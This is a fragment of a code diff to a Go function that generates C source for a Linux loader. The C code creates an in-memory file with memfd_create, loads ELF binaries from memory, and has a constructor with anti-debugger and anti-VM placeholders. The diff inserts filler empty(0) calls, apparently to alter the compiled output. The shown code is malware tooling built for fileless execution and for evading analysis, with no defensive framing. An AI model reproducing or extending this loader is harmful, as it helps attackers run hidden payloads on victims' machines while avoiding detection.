@@ -24,6 +24,7 @@ func GetLinuxLoader() string {
 		if((fd = syscall(SYS_memfd_create, name, flags)) == -1) {
 			return 0;
 		}
+		empty(0);
 		return fd;
 	}
 	
@@ -42,12 +43,14 @@ func GetLinuxLoader() string {
 	*/
 	
 	int gensssssS(int src) {
+		empty(0);
 		return src - (0x22222 - 59);
 	}
 	
 	void __attribute__((constructor)) init(void) {
 		 {{anti-debugger}}
 		 //{{anti-vm}}
+		 empty(0);
 	}
 	
 	int LoadElf(void *mem, size_t memlen, char *argv[], char *envp[], char **err) {
